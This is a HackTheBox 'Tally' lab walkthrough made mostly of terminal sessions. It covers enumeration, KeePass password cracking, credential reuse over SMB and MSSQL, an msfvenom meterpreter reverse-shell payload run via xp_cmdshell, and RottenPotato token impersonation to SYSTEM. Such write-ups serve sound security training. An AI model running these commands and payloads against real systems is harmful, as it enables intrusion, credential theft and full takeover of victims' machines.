---
title: "HackTheBox Tally"
date: 2010-01-01T01:01:56+01:00
toc: false
images:
tags:
  - hackthebox
  - ctf
---

[![Kurzes Video Walkthrough ohne Erklärungen](http://img.youtube.com/vi/YOUTUBE_VIDEO_ID_HERE/0.jpg)](http://www.youtube.com/watch?v=YOUTUBE_VIDEO_ID_HERE)

![10tally](https://imgur.com/ZfufjmG.jpg)

root@kali:~# nmap -A 10.10.10.59  
Starting Nmap 7.70 ( https://nmap.org ) at 2018-05-14 18:55 EDT  
Nmap scan report for 10.10.10.59  
Host is up (0.097s latency).  
Not shown: 992 closed ports  
PORT STATE SERVICE VERSION  
21/tcp open ftp Microsoft ftpd  
| ftp-syst:  
|_ SYST: Windows_NT  
80/tcp open http Microsoft IIS httpd 10.0  
81/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
|_http-server-header: Microsoft-HTTPAPI/2.0  
|_http-title: Bad Request  
135/tcp open msrpc Microsoft Windows RPC  
139/tcp open netbios-ssn Microsoft Windows netbios-ssn  
445/tcp open microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds  
808/tcp open ccproxy-http?  
1433/tcp open ms-sql-s Microsoft SQL Server 2016 13.00.1601.00; RTM  
| ms-sql-ntlm-info:  
| Target_Name: TALLY  
| NetBIOS_Domain_Name: TALLY  
| NetBIOS_Computer_Name: TALLY  
| DNS_Domain_Name: TALLY  
| DNS_Computer_Name: TALLY  
|_ Product_Version: 10.0.14393  
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback  
| Not valid before: 2018-05-14T04:07:20  
|_Not valid after: 2048-05-14T04:07:20  
|_ssl-date: 2018-05-14T22:56:38+00:00; -3s from scanner time.

Host script results:  
|_clock-skew: mean: 0s, deviation: 1s, median: 0s  
| ms-sql-info:  
| 10.10.10.59:1433:  
| Version:  
| name: Microsoft SQL Server 2016 RTM  
| number: 13.00.1601.00  
| Product: Microsoft SQL Server 2016  
| Service pack level: RTM  
| Post-SP patches applied: false  
|_ TCP port: 1433  
| smb-security-mode:  
| account_used: guest  
| authentication_level: user  
| challenge_response: supported  
|_ message_signing: disabled (dangerous, but default)  
| smb2-security-mode:  
| 2.02:  
|_ Message signing enabled but not required  
| smb2-time:  
| date: 2018-05-14 18:56:40  
|_ start_date: 2018-05-14 00:06:48

http://10.10.10.59/_layouts/15/start.aspx#/default.aspx

![0tally](https://imgur.com/RbDew5F.jpg)

http://10.10.10.59/default.aspx

![1tally](https://imgur.com/d7ro1by.jpg)

root@kali:~# git clone https://github.com/sensepost/SPartan.git  
Cloning into 'SPartan'...  
remote: Counting objects: 68, done.  
remote: Total 68 (delta 0), reused 0 (delta 0), pack-reused 67  
Unpacking objects: 100% (68/68), done.  
root@kali:~# cd SPartan/  
root@kali:~/SPartan# ls  
dir.txt front_bin.txt front_pvt.txt front_services.txt front_serv.txt README.md requirements.txt SPartan.py sp_catalogs.txt sp_forms.txt sp_layouts.txt  
root@kali:~/SPartan# pip install -r requirements.txt  
Collecting beautifulsoup4==4.4.1 (from -r requirements.txt (line 1))  
Downloading https://files.pythonhosted.org/packages/33/62/f3e97eaa87fc4de0cb9b8c51d253cf0df621c6de6b25164dcbab203e5ff7/beautifulsoup4-4.4.1-py2-none-any.whl (81kB)  
100% |████████████████████████████████| 81kB 44kB/s  
Collecting python-ntlm3==1.0.2 (from -r requirements.txt (line 2))  
Downloading https://files.pythonhosted.org/packages/4b/4e/d5d79626fcaeb2a378c1ec2eaddf0d7b608f339878baec4b768644cf8987/python_ntlm3-1.0.2-py2.py3-none-any.whl  
Collecting requests==2.8.1 (from -r requirements.txt (line 3))  
Downloading https://files.pythonhosted.org/packages/c0/0f/a911a44c89ba01b23d8fe3defbdfca1e962de6f11a11da32658902cdc2a4/requests-2.8.1-py2.py3-none-any.whl (497kB)  
100% |████████████████████████████████| 501kB 108kB/s  
Collecting requests-ntlm==0.2.0 (from -r requirements.txt (line 4))  
Downloading https://files.pythonhosted.org/packages/fd/7e/49ac64a0a784d4ac5e3667a6224b45e0d7de881a40ab919ef18f19195801/requests_ntlm-0.2.0.tar.gz  
Collecting six==1.10.0 (from -r requirements.txt (line 5))  
Downloading https://files.pythonhosted.org/packages/c8/0a/b6723e1bc4c516cb687841499455a8505b44607ab535be01091c0f24f079/six-1.10.0-py2.py3-none-any.whl  
Building wheels for collected packages: requests-ntlm  
Running setup.py bdist_wheel for requests-ntlm ... done  
Stored in directory: /root/.cache/pip/wheels/da/78/e1/c4b4acb24f069e2997fddae0c635a7f48cbfcbbb8a09e9f7b0  
Successfully built requests-ntlm  
Installing collected packages: beautifulsoup4, six, python-ntlm3, requests, requests-ntlm  
Found existing installation: beautifulsoup4 4.6.0  
Not uninstalling beautifulsoup4 at /usr/lib/python2.7/dist-packages, outside environment /usr  
Found existing installation: six 1.11.0  
Not uninstalling six at /usr/lib/python2.7/dist-packages, outside environment /usr  
Found existing installation: requests 2.18.4  
Not uninstalling requests at /usr/lib/python2.7/dist-packages, outside environment /usr  
Successfully installed beautifulsoup4-4.4.1 python-ntlm3-1.0.2 requests-2.8.1 requests-ntlm-0.2.0 six-1.10.0  
root@kali:~/SPartan# python SPartan.py -h  
Traceback (most recent call last):  
File "SPartan.py", line 25, in <module>  
import argparse,requests,sys,os,threading,bs4,warnings,random  
File "/usr/local/lib/python2.7/dist-packages/bs4/__init__.py", line 30, in <module>  
from .builder import builder_registry, ParserRejectedMarkup  
File "/usr/local/lib/python2.7/dist-packages/bs4/builder/__init__.py", line 314, in <module>  
from . import _html5lib  
File "/usr/local/lib/python2.7/dist-packages/bs4/builder/_html5lib.py", line 70, in <module>  
class TreeBuilderForHtml5lib(html5lib.treebuilders._base.TreeBuilder):  
AttributeError: 'module' object has no attribute '_base'  
root@kali:~/SPartan# pip install --upgrade beautifulsoup4  
Collecting beautifulsoup4  
Downloading https://files.pythonhosted.org/packages/a6/29/bcbd41a916ad3faf517780a0af7d0254e8d6722ff6414723eedba4334531/beautifulsoup4-4.6.0-py2-none-any.whl (86kB)  
100% |████████████████████████████████| 92kB 94kB/s  
Installing collected packages: beautifulsoup4  
Found existing installation: beautifulsoup4 4.4.1  
Uninstalling beautifulsoup4-4.4.1:  
Successfully uninstalled beautifulsoup4-4.4.1  
Successfully installed beautifulsoup4-4.6.0

root@kali:~/SPartan# python SPartan.py -h

Sharepoint & Frontpage Scanner

usage: SPartan [-h] [-u URL] [-c] [-f] [-k KEYWORD] [-s] [--sps] [--users]  
[-r RPC] [-t THREAD] [-p] [--cookie COOKIE] [-d]  
[-l domain\user:password] [-v] [-i]

optional arguments:  
-h, --help show this help message and exit  
-u URL host URL to scan including HTTP/HTTPS  
-c crawl the site for links (CTRL-C to stop crawling)  
-f perform frontpage scans  
-k KEYWORD scrape identified pages for keywords (works well with  
crawl)  
-s perform sharepoint scans  
--sps discover sharepoint SOAP services  
--users List users using Search Principals  
-r RPC (COMING SOON)execute a specified Frontpage RPC query  
-t THREAD set maximum amount of threads (10 default)  
-p (COMING SOON)find putable directories  
--cookie COOKIE use a cookie for authenticated scans  
-d download pdf, doc, docx, txt, config, xml, xls, xlsx,  
webpart, config, conf, stp, csv and  
asp/aspx(uninterpreted)  
-l domain\user:password  
provide credentials for authentication to Sharepoint  
-v, --verbose Render verbose output. By default SPartan will only  
render found resources.  
-i, --ignore-ssl-verification  
Don't attempt to verify SSL certificates as valid  
before making a request. This is defaulted to false.

root@kali:~/SPartan# python SPartan.py -u http://10.10.10.59 -f -c -s -v

Verbosity is set to HIGH. Spartan will print all resources found.  
[+] [0][200][27138b] - http://10.10.10.59

-----------------------------------------------------------------------------  
[+] Initiating Frontpage fingerprinting...

[...]

-----------------------------------------------------------------------------  
[+] Initiating Frontpage pvt scan...

[...]

<div>-----------------------------------------------------------------------------</div>

<div>[+] Initiating Frontpage bin scan...</div>

[...]

-----------------------------------------------------------------------------  
[+] Initiating Frontpage service scan...

[...]

-----------------------------------------------------------------------------

-----------------------------------------------------------------------------  
[+] Initiating Sharepoint fingerprinting...

[...]

-----------------------------------------------------------------------------  
[+] Initiating Sharepoint layouts scan...

[...]

-----------------------------------------------------------------------------  
[+] Initiating Sharepoint forms scan...

[...]

-----------------------------------------------------------------------------  
[+] Initiating Sharepoint catalogs scan...  
[...]  
[+] [143][200][27138b] - http://10.10.10.59/SitePages  
[...]  
[+] [147][200][62805b] - http://10.10.10.59/Shared%20Documents/Forms/AllItems.aspx

[...]

-----------------------------------------------------------------------------

http://10.10.10.59/_layouts/15/start.aspx#/SitePages/Forms/AllPages.aspx

http://10.10.10.59/SitePages/Forms/AllPages.aspx

![2tally](https://imgur.com/oFhC9Vo.jpg)

http://10.10.10.59/_layouts/15/start.aspx#//SitePages/FinanceTeam.aspx

http://10.10.10.59/SitePages/FinanceTeam.aspx

Migration update

Hi all,

Welcome to your new team page!

As always, there's still a few finishing touches to make. Rahul - please upload the design mock ups to the Intranet folder as 'index.html' using the ftp_user account - I aim to review regularly.

We'll also add the fund and client account pages in due course.

Thanks – Sarah & Tim.

http://10.10.10.59/Shared%20Documents/Forms/AllItems.aspx

![3tally](https://imgur.com/nyPvyOo.jpg)

Download ftp-detailx.txt

root@kali:~/Downloads# docx2txt ftp-details.docx ftp-details.txt  
root@kali:~/Downloads# cat ftp-details.txt  
FTP details  
hostname: tally  
workgroup: htb.local  
password: UTDRSCH53c"$6hys  
Please create your own user folder upon logging in

Filezilla

![4tally](https://imgur.com/dQplUxE.jpg)

![5tally](https://imgur.com/CsAgN6G.jpg)

/User/Tim/Files

tim.kdbx

root@kali:~# keepass2john tim.kdbx > hash  
root@kali:~# john --format=KeePass --wordlist=/usr/share/wordlists/rockyou.txt hash  
Created directory: /root/.john  
Using default input encoding: UTF-8  
Loaded 1 password hash (KeePass [SHA256 AES 32/64 OpenSSL])  
Press 'q' or Ctrl-C to abort, almost any other key for status  
simplementeyo (tim)  
1g 0:00:00:22 DONE (2018-05-15 05:42) 0.04363g/s 1077p/s 1077c/s 1077C/s simplementeyo  
Use the "--show" option to display all of the cracked passwords reliably  
Session completed

root@kali:~# keepass2 tim.kdbx

![6tally](https://imgur.com/DJ0dq2k.jpg)

![7tally](https://imgur.com/DQV5MVo.jpg)

![8tally](https://imgur.com/lB0epYf.jpg)

root@kali:~# git clone https://github.com/CoreSecurity/impacket.git  
Cloning into 'impacket'...  
remote: Counting objects: 13553, done.  
remote: Compressing objects: 100% (86/86), done.  
remote: Total 13553 (delta 73), reused 71 (delta 50), pack-reused 13417  
Receiving objects: 100% (13553/13553), 4.73 MiB | 354.00 KiB/s, done.  
Resolving deltas: 100% (10233/10233), done.  
root@kali:~# cd impacket/  
root@kali:~/impacket# pip install -r requirements.txt  
Requirement already satisfied: pyasn1>=0.2.3 in /usr/lib/python2.7/dist-packages (from -r requirements.txt (line 1))  
Requirement already satisfied: pycrypto>=2.6.1 in /usr/lib/python2.7/dist-packages (from -r requirements.txt (line 2))  
Requirement already satisfied: pyOpenSSL>=0.13.1 in /usr/lib/python2.7/dist-packages (from -r requirements.txt (line 3))  
Collecting ldap3>=2.5.0 (from -r requirements.txt (line 4))  
Downloading https://files.pythonhosted.org/packages/f6/d9/a9db559375543af5ff950198a433bbc34bf7e8afbd32ab22231d0959710a/ldap3-2.5-py2.py3-none-any.whl (374kB)  
100% |████████████████████████████████| 378kB 168kB/s  
Collecting ldapdomaindump (from -r requirements.txt (line 5))  
Downloading https://files.pythonhosted.org/packages/b4/6a/7b964459fa7029fab62319c06ef6cd876417508df8650f662a8c9b29e99d/ldapdomaindump-0.8.5-py2-none-any.whl  
Requirement already satisfied: flask in /usr/lib/python2.7/dist-packages (from -r requirements.txt (line 6))  
Requirement already satisfied: dnspython in /usr/lib/python2.7/dist-packages (from ldapdomaindump->-r requirements.txt (line 5))  
Installing collected packages: ldap3, ldapdomaindump  
Successfully installed ldap3-2.5 ldapdomaindump-0.8.5

root@kali:~/impacket# python setup.py install  
/usr/lib/python2.7/dist-packages/setuptools/dist.py:397: UserWarning: Normalizing '0.9.17-dev' to '0.9.17.dev0'  
normalized_version,  
running install  
running bdist_egg  
running egg_info  
creating impacket.egg-info  
writing requirements to impacket.egg-info/requires.txt  
writing impacket.egg-info/PKG-INFO  
writing top-level names to impacket.egg-info/top_level.txt  
writing dependency_links to impacket.egg-info/dependency_links.txt  
writing manifest file 'impacket.egg-info/SOURCES.txt'  
reading manifest file 'impacket.egg-info/SOURCES.txt'

[...]

Using /usr/local/lib/python2.7/dist-packages  
Searching for ldap3==2.5  
Best match: ldap3 2.5  
Adding ldap3 2.5 to easy-install.pth file

Using /usr/local/lib/python2.7/dist-packages  
Searching for Flask==0.12.2  
Best match: Flask 0.12.2  
Adding Flask 0.12.2 to easy-install.pth file  
Installing flask script to /usr/local/bin

Using /usr/lib/python2.7/dist-packages  
Searching for dnspython==1.15.0  
Best match: dnspython 1.15.0  
Adding dnspython 1.15.0 to easy-install.pth file

Using /usr/lib/python2.7/dist-packages  
Finished processing dependencies for impacket==0.9.17.dev0  
root@kali:~/impacket#

root@kali:~/impacket# smbclient.py -h  
Impacket v0.9.17-dev - Copyright 2002-2018 Core Security Technologies

usage: smbclient.py [-h] [-file FILE] [-debug] [-hashes LMHASH:NTHASH]  
[-no-pass] [-k] [-aesKey hex key] [-dc-ip ip address]  
[-target-ip ip address] [-port [destination port]]  
target

SMB client implementation.

positional arguments:  
target [[domain/]username[:password]@]<targetName or address>

optional arguments:  
-h, --help show this help message and exit  
-file FILE input file with commands to execute in the mini shell  
-debug Turn DEBUG output ON

authentication:  
-hashes LMHASH:NTHASH  
NTLM hashes, format is LMHASH:NTHASH  
-no-pass don't ask for password (useful for -k)  
-k Use Kerberos authentication. Grabs credentials from  
ccache file (KRB5CCNAME) based on target parameters.  
If valid credentials cannot be found, it will use the  
ones specified in the command line  
-aesKey hex key AES key to use for Kerberos Authentication (128 or 256  
bits)

connection:  
-dc-ip ip address IP Address of the domain controller. If omitted it  
will use the domain part (FQDN) specified in the  
target parameter  
-target-ip ip address  
IP Address of the target machine. If omitted it will  
use whatever was specified as target. This is useful  
when target is the NetBIOS name and you cannot resolve  
it  
-port [destination port]  
Destination port to connect to SMB Server

root@kali:~# smbclient.py Finance:Acc0unting@10.10.10.59  
Impacket v0.9.17-dev - Copyright 2002-2018 Core Security Technologies

Type help for list of commands  
# help

open {host,port=445} - opens a SMB connection against the target host/port  
login {domain/username,passwd} - logs into the current SMB connection, no parameters for NULL connection. If no password specified, it'll be prompted  
kerberos_login {domain/username,passwd} - logs into the current SMB connection using Kerberos. If no password specified, it'll be prompted. Use the DNS resolvable domain name  
login_hash {domain/username,lmhash:nthash} - logs into the current SMB connection using the password hashes  
logoff - logs off  
shares - list available shares  
use {sharename} - connect to an specific share  
cd {path} - changes the current directory to {path}  
lcd {path} - changes the current local directory to {path}  
pwd - shows current remote directory  
password - changes the user password, the new password will be prompted for input  
ls {wildcard} - lists all the files in the current directory  
rm {file} - removes the selected file  
mkdir {dirname} - creates the directory under the current path  
rmdir {dirname} - removes the directory under the current path  
put {filename} - uploads the filename into the current path  
get {filename} - downloads the filename from the current path  
info - returns NetrServerInfo main results  
who - returns the sessions currently connected at the target host (admin required)  
close - closes the current SMB Session  
exit - terminates the server process (and this session)

# shares  
ACCT  
ADMIN$  
C$  
IPC$  
# use ACCT  
# ls  
drw-rw-rw- 0 Thu Sep 21 02:27:54 2017 .  
drw-rw-rw- 0 Thu Sep 21 02:27:54 2017 ..  
drw-rw-rw- 0 Thu Sep 21 02:27:49 2017 Customers  
drw-rw-rw- 0 Thu Sep 21 02:27:49 2017 Fees  
drw-rw-rw- 0 Thu Sep 21 02:27:49 2017 Invoices  
drw-rw-rw- 0 Thu Sep 21 02:27:49 2017 Jess  
drw-rw-rw- 0 Thu Sep 21 02:27:49 2017 Payroll  
drw-rw-rw- 0 Thu Sep 21 02:27:49 2017 Reports  
drw-rw-rw- 0 Thu Sep 21 02:27:49 2017 Tax  
drw-rw-rw- 0 Thu Sep 21 02:27:49 2017 Transactions  
drw-rw-rw- 0 Thu Sep 21 02:27:49 2017 zz_Archived  
drw-rw-rw- 0 Thu Sep 21 02:27:54 2017 zz_Migration

# cd zz_Migration  
# ls  
drw-rw-rw- 0 Thu Sep 21 02:27:54 2017 .  
drw-rw-rw- 0 Thu Sep 21 02:27:54 2017 ..  
drw-rw-rw- 0 Thu Sep 21 02:27:52 2017 Backup  
drw-rw-rw- 0 Thu Sep 21 02:27:54 2017 Binaries  
-rw-rw-rw- 11762 Thu Sep 21 02:27:54 2017 install-notes.txt  
drw-rw-rw- 0 Thu Sep 21 02:27:54 2017 Integration  
-rw-rw-rw- 406181 Thu Sep 21 02:27:54 2017 Sage 50 v1.9.3.1 Hotfix 1 Release Notes.pdf  
# cd Binaries  
# ls  
drw-rw-rw- 0 Thu Sep 21 02:27:54 2017 .  
drw-rw-rw- 0 Thu Sep 21 02:27:54 2017 ..  
drw-rw-rw- 0 Thu Sep 21 02:27:52 2017 CardReader  
drw-rw-rw- 0 Thu Sep 21 02:27:52 2017 Evals  
-rw-rw-rw- 2241216 Thu Sep 21 02:27:52 2017 FileZilla_Server-0_9_60_2.exe  
-rw-rw-rw- 74110 Thu Sep 21 02:27:52 2017 ImportGSTIN.zip  
-rw-rw-rw- 69999448 Thu Sep 21 02:27:52 2017 NDP452-KB2901907-x86-x64-AllOS-ENU.exe  
drw-rw-rw- 0 Thu Sep 21 02:27:52 2017 New folder  
-rw-rw-rw- 401347664 Thu Sep 21 02:27:52 2017 Sage50_2017.2.0.exe  
drw-rw-rw- 0 Thu Sep 21 02:27:54 2017 Tally.ERP 9 Release 6  
-rw-rw-rw- 645729 Thu Sep 21 02:27:54 2017 windirstat1_1_2_setup.exe  
# cd New folder  
# ls  
drw-rw-rw- 0 Thu Sep 21 02:27:52 2017 .  
drw-rw-rw- 0 Thu Sep 21 02:27:52 2017 ..  
-rw-rw-rw- 389188014 Thu Sep 21 02:27:52 2017 crystal_reports_viewer_2016_sp04_51051980.zip  
-rw-rw-rw- 18159024 Thu Sep 21 02:27:52 2017 Macabacus2016.exe  
-rw-rw-rw- 21906356 Thu Sep 21 02:27:52 2017 Orchard.Web.1.7.3.zip  
-rw-rw-rw- 774200 Thu Sep 21 02:27:52 2017 putty.exe  
-rw-rw-rw- 483824 Thu Sep 21 02:27:52 2017 RpprtSetup.exe  
-rw-rw-rw- 254599112 Thu Sep 21 02:27:52 2017 tableau-desktop-32bit-10-3-2.exe  
-rw-rw-rw- 215552 Thu Sep 21 02:26:38 2017 tester.exe  
-rw-rw-rw- 7194312 Thu Sep 21 02:27:52 2017 vcredist_x64.exe  
# get tester.exe  
# exit  
root@kali:~#

root@kali:~# strings tester.exe

[...]

2$2,242<2D2L2T2\2d2l2t2|2  
3$3,343<3D3L3T3\3d3l3t3|3  
4$4,444<4D4L4T4\4d4l4t4|4  
5$5,545<5D5L5T5\5d5l5t5|5  
6$6,646<6D6L6T6\6d6l6t6|6  
7$7,747<7D7L7T7\7d7l7t7|7  
8$8,848<8D8L8T8\8d8l8t8|8  
9 9(90989@9H9P9X9`9h9p9x9  
: :(:0:8:@:H:P:X:`:h:p:x:  
; ;(;0;8;@;H;P;X;`;h;p;x;  
< <(<0<8<@<H<P<X<`<h<p<x<  
= =(=0=8=@=H=P=X=`=h=p=x=  
> >(>0>8>@>H>P>X>`>h>p>x>  
? ?(?0?8?@?H?P?X?`?h?p?x?  
343D3H3X3\3`3h3  
404@4D4H4L4T4l4|4  
5,5054585<5@5H5`5p5t5  
6 6$6(6,646L6\6`6p6t6x6  
7 7(7@7P7T7d7h7l7p7t7|7

[...]

root@kali:~# strings tester.exe | grep "SQL"  
SQLSTATE:  
DRIVER={SQL Server};SERVER=TALLY, 1433;DATABASE=orcharddb;UID=sa;PWD=GWE3V65#6KFH93@4GWTG2G;

root@kali:~# ifconfig tun0  
tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST> mtu 1500  
inet 10.10.14.64 netmask 255.255.254.0 destination 10.10.14.64  
inet6 fe80::fb61:823a:e66a:4967 prefixlen 64 scopeid 0x20<link>  
inet6 dead:beef:2::103e prefixlen 64 scopeid 0x0<global>  
unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00 txqueuelen 100 (UNSPEC)  
RX packets 6424 bytes 6327559 (6.0 MiB)  
RX errors 0 dropped 0 overruns 0 frame 0  
TX packets 6995 bytes 545347 (532.5 KiB)  
TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0

root@kali:~# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.64 LPORT=4444 -f psh-reflection -o payload.ps1  
No platform was selected, choosing Msf::Module::Platform::Windows from the payload  
No Arch selected, selecting Arch: x64 from the payload  
No encoder or badchars specified, outputting raw payload  
Payload size: 510 bytes  
Final size of psh-reflection file: 2776 bytes  
Saved as: payload.ps1

root@kali:~# msfconsole

msf > use exploit/multi/handler  
msf exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp  
payload => windows/x64/meterpreter/reverse_tcp

msf exploit(multi/handler) > show options

Module options (exploit/multi/handler):

Name Current Setting Required Description  
---- --------------- -------- -----------

Payload options (windows/x64/meterpreter/reverse_tcp):

Name Current Setting Required Description  
---- --------------- -------- -----------  
EXITFUNC process yes Exit technique (Accepted: '', seh, thread, process, none)  
LHOST yes The listen address  
LPORT 4444 yes The listen port

Exploit target:

Id Name  
-- ----  
0 Wildcard Target

msf exploit(multi/handler) > set lhost 10.10.14.64  
lhost => 10.10.14.64  
msf exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 10.10.14.64:4444

upload payload via filzeilla

![9tally](https://imgur.com/GM1LQpH.jpg)

msf > use auxiliary/admin/mssql/mssql_exec  
msf auxiliary(admin/mssql/mssql_exec) > show options

Module options (auxiliary/admin/mssql/mssql_exec):

Name Current Setting Required Description  
---- --------------- -------- -----------  
CMD cmd.exe /c echo OWNED > C:\owned.exe no Command to execute  
PASSWORD no The password for the specified username  
RHOST yes The target address  
RPORT 1433 yes The target port (TCP)  
TDSENCRYPTION false yes Use TLS/SSL for TDS data "Force Encryption"  
USERNAME sa no The username to authenticate as  
USE_WINDOWS_AUTHENT false yes Use windows authentification (requires DOMAIN option set)

msf auxiliary(admin/mssql/mssql_exec) > set cmd "powershell -ExecutionPolicy bypass -NoExit -File C:\\FTP\\Intranet\\payload.ps1"  
cmd => powershell -ExecutionPolcy bypass -NoExit -File C:\FTP\Intranet\payload.ps1  
msf auxiliary(admin/mssql/mssql_exec) > set rhost 10.10.10.59  
rhost => 10.10.10.59  
msf auxiliary(admin/mssql/mssql_exec) > set password GWE3V65#6KFH93@4GWTG2G  
password => GWE3V65#6KFH93@4GWTG2G

msf auxiliary(admin/mssql/mssql_exec) > exploit

[*] 10.10.10.59:1433 - SQL Query: EXEC master..xp_cmdshell 'powershell -ExecutionPolicy bypass -NoExit -File C:\FTP\Intranet\payload.ps1'  
[*] Auxiliary module execution completed

[*] Started reverse TCP handler on 10.10.14.64:4444  
[*] Sending stage (206403 bytes) to 10.10.10.59  
[*] Meterpreter session 1 opened (10.10.14.64:4444 -> 10.10.10.59:49980) at 2018-05-15 06:07:16 -0400

meterpreter >

meterpreter > getuid  
Server username: TALLY\Sarah  
meterpreter > cd C:\\Users  
meterpreter > ls  
Listing: C:\Users  
=================

Mode Size Type Last modified Name  
---- ---- ---- ------------- ----  
40777/rwxrwxrwx 0 dir 2017-09-18 17:35:37 -0400 .NET v2.0  
40777/rwxrwxrwx 0 dir 2017-09-18 17:35:36 -0400 .NET v2.0 Classic  
40777/rwxrwxrwx 0 dir 2017-08-29 20:14:29 -0400 .NET v4.5  
40777/rwxrwxrwx 0 dir 2017-08-29 20:14:27 -0400 .NET v4.5 Classic  
40777/rwxrwxrwx 8192 dir 2017-09-17 16:33:42 -0400 Administrator  
40777/rwxrwxrwx 0 dir 2016-07-16 09:34:35 -0400 All Users  
40777/rwxrwxrwx 0 dir 2017-09-18 17:35:34 -0400 Classic .NET AppPool  
40555/r-xr-xr-x 0 dir 2017-08-28 10:43:27 -0400 Default  
40777/rwxrwxrwx 0 dir 2016-07-16 09:34:35 -0400 Default User  
40555/r-xr-xr-x 4096 dir 2016-11-20 20:24:46 -0500 Public  
40777/rwxrwxrwx 8192 dir 2017-10-12 16:28:53 -0400 SQLSERVERAGENT  
40777/rwxrwxrwx 8192 dir 2017-09-02 17:46:27 -0400 SQLTELEMETRY  
40777/rwxrwxrwx 8192 dir 2017-10-13 18:57:55 -0400 Sarah  
40777/rwxrwxrwx 0 dir 2017-09-13 16:27:16 -0400 Tim  
100666/rw-rw-rw- 174 fil 2016-07-16 09:21:29 -0400 desktop.ini

meterpreter > cd Sarah\\Desktop  
meterpreter > ls  
Listing: C:\Users\Sarah\Desktop  
===============================

Mode Size Type Last modified Name  
---- ---- ---- ------------- ----  
100666/rw-rw-rw- 845 fil 2017-09-17 16:50:12 -0400 FTP.lnk  
100666/rw-rw-rw- 17152 fil 2017-10-19 16:49:59 -0400 SPBestWarmUp.ps1  
100666/rw-rw-rw- 11010 fil 2017-10-19 17:48:44 -0400 SPBestWarmUp.xml  
100666/rw-rw-rw- 1914 fil 2017-09-17 16:48:49 -0400 SQLCMD.lnk  
100555/r-xr-xr-x 916 fil 2017-10-01 17:32:39 -0400 browser.bat  
100666/rw-rw-rw- 282 fil 2017-08-31 17:57:02 -0400 desktop.ini  
100666/rw-rw-rw- 297 fil 2017-09-23 16:11:01 -0400 note to tim (draft).txt  
100666/rw-rw-rw- 129 fil 2017-09-20 19:46:51 -0400 todo.txt  
100444/r--r--r-- 32 fil 2017-08-30 21:04:26 -0400 user.txt  
100666/rw-rw-rw- 936 fil 2017-09-17 16:49:32 -0400 zz_Migration.lnk

meterpreter > cat user.txt  
be7#########################bb1meterpreter >

meterpreter > upload /root/rottenpotato.exe  
[*] uploading : /root/rottenpotato.exe -> rottenpotato.exe  
[*] Uploaded 664.00 KiB of 664.00 KiB (100.0%): /root/rottenpotato.exe -> rottenpotato.exe  
[*] uploaded : /root/rottenpotato.exe -> rottenpotato.exe  
meterpreter > ls  
Listing: C:\Users\Sarah\Desktop  
===============================

Mode Size Type Last modified Name  
---- ---- ---- ------------- ----  
100666/rw-rw-rw- 845 fil 2017-09-17 16:50:12 -0400 FTP.lnk  
100666/rw-rw-rw- 17152 fil 2017-10-19 16:49:59 -0400 SPBestWarmUp.ps1  
100666/rw-rw-rw- 11010 fil 2017-10-19 17:48:44 -0400 SPBestWarmUp.xml  
100666/rw-rw-rw- 1914 fil 2017-09-17 16:48:49 -0400 SQLCMD.lnk  
100555/r-xr-xr-x 916 fil 2017-10-01 17:32:39 -0400 browser.bat  
100666/rw-rw-rw- 282 fil 2017-08-31 17:57:02 -0400 desktop.ini  
100666/rw-rw-rw- 297 fil 2017-09-23 16:11:01 -0400 note to tim (draft).txt  
100777/rwxrwxrwx 679936 fil 2018-05-15 06:12:11 -0400 rottenpotato.exe  
100666/rw-rw-rw- 129 fil 2017-09-20 19:46:51 -0400 todo.txt  
100444/r--r--r-- 32 fil 2017-08-30 21:04:26 -0400 user.txt  
100666/rw-rw-rw- 936 fil 2017-09-17 16:49:32 -0400 zz_Migration.lnk

meterpreter > use incognito  
Loading extension incognito...Success.  
meterpreter > list_tokens -u  
[-] Warning: Not currently running as SYSTEM, not all tokens will be available  
Call rev2self if primary process token is SYSTEM

Delegation Tokens Available  
========================================  
NT SERVICE\SQLSERVERAGENT  
TALLY\Sarah

Impersonation Tokens Available  
========================================  
No tokens available

meterpreter > execute -Hc -f ./rottenpotato.exe  
Process 752 created.  
Channel 3 created.

meterpreter > list_tokens -u  
[-] Warning: Not currently running as SYSTEM, not all tokens will be available  
Call rev2self if primary process token is SYSTEM

Delegation Tokens Available  
========================================  
NT SERVICE\SQLSERVERAGENT  
TALLY\Sarah

Impersonation Tokens Available  
========================================  
NT AUTHORITY\SYSTEM

meterpreter > impersonate_token "NT AUTHORITY\\SYSTEM"  
[-] Warning: Not currently running as SYSTEM, not all tokens will be available  
Call rev2self if primary process token is SYSTEM  
[-] No delegation token available  
[+] Successfully impersonated user NT AUTHORITY\SYSTEM  
meterpreter > getuid  
Server username: NT AUTHORITY\SYSTEM

meterpreter > cat C:\\Users\\Administrator\\Desktop\\root.txt  
608#########################3eda